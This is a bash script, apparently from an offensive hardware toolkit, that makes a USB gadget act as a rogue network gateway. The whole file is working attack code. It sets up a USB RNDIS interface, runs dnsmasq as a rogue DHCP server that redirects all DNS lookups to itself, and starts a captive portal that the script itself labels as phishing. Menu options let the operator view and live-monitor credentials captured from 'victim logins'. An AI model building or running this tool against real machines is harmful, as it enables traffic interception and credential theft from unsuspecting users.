#!/usr/bin/env bash
#
# hard-tools: scripts/badusb.sh
# BadUSB Rogue Gateway, DNS Spoofer & Captive Portal
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$(cd "${SCRIPT_DIR}/../lib" && pwd)"
source "${LIB_DIR}/utils.sh"

FUNC_NAME="rndis.rndis"
IFACE_IP="192.168.42.1"
DHCP_START="192.168.42.100"
DHCP_END="192.168.42.200"

PID_DNSMASQ="/tmp/badusb_dnsmasq.pid"
PID_PORTAL="/tmp/badusb_portal.pid"
CONF_FILE="/tmp/badusb_dnsmasq.conf"
LOG_CREDS="/tmp/badusb_credentials.log"
PORTAL_SCRIPT="${LIB_DIR}/rogue_portal.py"

detect_iface() {
    for iface in rndis0 usb0 usb1; do
        if ip link show "$iface" >/dev/null 2>&1; then
            echo "$iface"
            return 0
        fi
    done
    echo "rndis0"
}

start_rogue_services() {
    local iface="$1"
    stop_rogue_services

    log_info "Configuring network interface ${iface} -> ${IFACE_IP}/24..."
    sudo ip link set "${iface}" up 2>/dev/null || true
    sudo ip addr flush dev "${iface}" 2>/dev/null || true
    sudo ip addr add "${IFACE_IP}/24" dev "${iface}" 2>/dev/null || true

    log_info "Configuring Rogue DNS + DHCP (Wildcard DNS -> ${IFACE_IP})..."
    cat << DCOF | sudo tee "${CONF_FILE}" >/dev/null
interface=${iface}
except-interface=lo
bind-interfaces
listen-address=${IFACE_IP}
dhcp-range=${DHCP_START},${DHCP_END},12h
dhcp-option=3,${IFACE_IP}
dhcp-option=6,${IFACE_IP}
address=/#/${IFACE_IP}
pid-file=${PID_DNSMASQ}
log-facility=/tmp/badusb_dnsmasq.log
DCOF

    sudo dnsmasq -C "${CONF_FILE}"
    log_success "Rogue DNS & DHCP server started."

    log_info "Starting Captive Portal Web Server on port 80..."
    sudo python3 "${PORTAL_SCRIPT}" 80 >/dev/null 2>&1 &
    echo $! | sudo tee "${PID_PORTAL}" >/dev/null
    log_success "Captive portal running."
}

stop_rogue_services() {
    if [[ -f "${PID_DNSMASQ}" ]]; then
        local pid
        pid=$(sudo cat "${PID_DNSMASQ}" 2>/dev/null || true)
        if [[ -n "${pid}" ]] && kill -0 "${pid}" 2>/dev/null; then
            sudo kill "${pid}" 2>/dev/null || true
        fi
        sudo rm -f "${PID_DNSMASQ}" "${CONF_FILE}" 2>/dev/null || true
    fi
    sudo pkill -f "dnsmasq.*badusb_dnsmasq" 2>/dev/null || true

    if [[ -f "${PID_PORTAL}" ]]; then
        local ppid
        ppid=$(sudo cat "${PID_PORTAL}" 2>/dev/null || true)
        if [[ -n "${ppid}" ]] && kill -0 "${ppid}" 2>/dev/null; then
            sudo kill "${ppid}" 2>/dev/null || true
        fi
        sudo rm -f "${PID_PORTAL}" 2>/dev/null || true
    fi
    sudo pkill -f "python3.*rogue_portal" 2>/dev/null || true
}

start() {
    print_header "Starting BadUSB MITM / Rogue Gateway"
    unbind_udc
    link_function "${FUNC_NAME}" "${FUNC_NAME}"
    bind_udc

    sleep 1
    local iface
    iface=$(detect_iface)
    start_rogue_services "${iface}"
    log_success "BadUSB Rogue Gateway is ACTIVE."
}

stop() {
    print_header "Stopping BadUSB Rogue Gateway"
    local iface
    iface=$(detect_iface)
    stop_rogue_services

    sudo ip link set "${iface}" down 2>/dev/null || true
    sudo ip addr flush dev "${iface}" 2>/dev/null || true

    unbind_udc
    unlink_function "${FUNC_NAME}"

    local remaining
    remaining=$(list_active_functions)
    if [[ -n "${remaining}" ]]; then
        bind_udc
    fi
    log_success "BadUSB stopped."
}

status() {
    print_header "BadUSB Rogue Gateway Status"
    local linked="No"
    if is_function_linked "${FUNC_NAME}"; then
        linked="Yes (Active)"
    fi
    local udc
    udc=$(get_udc)
    local iface
    iface=$(detect_iface)

    local dns_status="Inactive"
    if [[ -f "${PID_DNSMASQ}" ]] && kill -0 "$(sudo cat "${PID_DNSMASQ}" 2>/dev/null || echo 0)" 2>/dev/null; then
        dns_status="Active (Wildcard DNS Spoofer)"
    fi

    local portal_status="Inactive"
    if [[ -f "${PID_PORTAL}" ]] && kill -0 "$(sudo cat "${PID_PORTAL}" 2>/dev/null || echo 0)" 2>/dev/null; then
        portal_status="Active (Port 80 Phishing / Portal)"
    fi

    echo -e "Function:        ${COLOR_CYAN}${FUNC_NAME}${COLOR_RESET}"
    echo -e "Linked:          ${linked}"
    echo -e "Active UDC:      ${udc:-<unbound>}"
    echo -e "Interface:       ${iface}"
    echo -e "Rogue DNS:       ${dns_status}"
    echo -e "Captive Portal:  ${portal_status}"
    echo
}

view_credentials() {
    print_header "Captured Credentials & HTTP Logs"
    if [[ -f "${LOG_CREDS}" && -s "${LOG_CREDS}" ]]; then
        cat "${LOG_CREDS}"
    else
        echo "  (No captured credentials yet)"
    fi
    echo
}

live_monitor() {
    print_header "Live Credential Monitor"
    touch "${LOG_CREDS}"
    echo "Listening for victim logins... (Press Ctrl+C to stop)"
    tail -f "${LOG_CREDS}"
}

menu() {
    while true; do
        print_header "BadUSB Rogue Gateway Manager"
        status
        echo " 1) Start BadUSB (Rogue Gateway + DNS Spoof + Captive Portal)"
        echo " 2) Stop BadUSB"
        echo " 3) View Captured Credentials"
        echo " 4) Live Credential Monitor"
        echo " 0) Back to Main Menu"
        echo
        read -rp "Choice: " choice
        case "$choice" in
            1) start; press_enter ;;
            2) stop; press_enter ;;
            3) view_credentials; press_enter ;;
            4) live_monitor ;;
            0) break ;;
            *) c_red "Invalid option."; sleep 1 ;;
        esac
    done
}

case "${1:-}" in
    start)   start ;;
    stop)    stop ;;
    status)  status ;;
    creds)   view_credentials ;;
    monitor) live_monitor ;;
    menu|"") menu ;;
    *) echo "Usage: $0 {start|stop|status|creds|monitor|menu}" ;;
esac
